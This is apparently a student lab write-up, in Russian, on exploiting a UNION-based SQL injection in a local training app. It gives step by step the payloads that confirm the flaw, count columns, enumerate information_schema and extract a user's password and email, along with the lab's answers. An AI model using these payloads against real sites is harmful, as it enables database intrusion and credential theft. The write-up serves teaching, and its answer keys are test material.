## Часть 2. Практическая работа с SQL-инъекциями

### 1. Поиск точки входа

Запрос:
```
http://localhost:8080/task/?id=1
```
Ответ:
```
Ваш id: 1
Ваш логин: admin
```
Всё работает. Видно, что приложение принимает параметр id и возвращает данные из БД.

Запрос:
Написала одиночную кавычку, чтобы нарушить синтаксис SQL.
```
http://localhost:8080/task/?id=1'
```
Ответ:
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
```
Ошибка есть, значит, ввод не фильтруется. Приложение явно собирает SQL-запрос конкатенацией строк.

Запрос:
Чтобы убедиться, что я могу влиять на запрос, попробовала добавить условие, которое всегда истинно.
```
http://localhost:8080/task/?id=1' OR 1=1 --+
```
Ответ:
```
Ваш id: 1
Ваш логин: admin
```
Страница загрузилась. Попробовала ложное условие:
```
http://localhost:8080/task/?id=1' AND 1=2 --+
```
Ответ: Пустая страница.
Уязвимость подтверждена. Я могу управлять логикой запроса.

Обоснование запроса:
Сначала я пробовала просто закрывать запрос кавычкой, но получала ошибки синтаксиса. Я поняла, что оригинальный запрос продолжает выполняться после моего ввода. Чтобы обрезать лишнюю часть запроса, нужно использовать комментарий (конструкцию --+).

### 2. Определение структуры запроса

Чтобы вытащить данные через UNION SELECT, нужно знать количество столбцов в исходном запросе. Видела решение через ORDER BY, но решила попробовать метод подбора NULL значений - мне так понятнее.

Попытка 1:
```
http://localhost:8080/task/?id=1' UNION SELECT NULL --+
```
Ошибка.

Попытка 2:
```
http://localhost:8080/task/?id=1' UNION SELECT NULL, NULL --+
```
Ошибка.

Попытка 3:
```
http://localhost:8080/task/?id=1' UNION SELECT NULL, NULL, NULL --+
```
Страница загрузилась успешно.
Вывод: В запросе 3 столбца.

### 3. Выяснение, какой столбец выводится на экран

```
http://localhost:8080/task/?id=10' UNION SELECT 1, 'TEST', 3 --+
```
Данные выводятся через второй столбец. Первый и третий игнорируются визуально. Можем подставлять туда любые данные из БД.

Наблюдение:
Сначала использовала id=1 для тестов, но заметила, что мои данные через UNION не отображаются - вместо них показывались данные существующего пользователя. Я поняла, что оригинальный запрос возвращает свою строку, и она приоритетна при отображении.
Тогда начала использовать id=10 (несуществующий ID). В этом случае оригинальный запрос возвращает пустой результат, и данные из моего UNION SELECT отображаются корректно. Это позволило мне точно видеть результат каждой инъекции.

### 4. Извлечение структуры базы данных

Сначала узнала имя текущей базы.

```
http://localhost:8080/task/?id=10' UNION SELECT 1, database(), 3 --+
```
Имя БД: security.

В MySQL вся мета-информация хранится в information_schema.
```
http://localhost:8080/task/?id=10' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema='security' --+
```
Есть таблица users (пароли) и emails (почта).


### 5. Задание 1

Сначала нужно узнать структуру таблицы users, чтобы знать имена столбцов.

```
http://localhost:8080/task/?id=10' UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name='users' --+
```
Есть стандартные столбцы id,username,password

Попытка получить пароль напрямую:
```
http://localhost:8080/task/?id=10' UNION SELECT 1, password, 3 FROM users --+
```
Вывелся только первый.

Решение через WHERE:
```
http://localhost:8080/task/?id=10' UNION SELECT 1, password, 3 FROM users WHERE username='Volk2' --+
```
**Ответ: Wa spoiuuuuu**

### 6. Задание 2

Неудачная попытка:
```
http://localhost:8080/task/?id=10' UNION SELECT 1, email, 3 FROM emails --+
```
Ошибка: Unknown column 'email' in 'field list'.

Посмотрела структуру таблицы emails.
```
http://localhost:8080/task/?id=10' UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name='emails' --+
```
Столбец называется email_id.

Узнаем ID пользователя Vinni-pukh в таблице users, чтобы связать её с таблицей emails.
```
http://localhost:8080/task/?id=10' UNION SELECT 1, id, 3 FROM users WHERE username='Vinni-pukh' --+
```
ID пользователя = 4.

```
http://localhost:8080/task/?id=10' UNION SELECT 1, email_id, 3 FROM emails WHERE id=4 --+
```
**Ответ: honey_lover@otus-lab.com.**
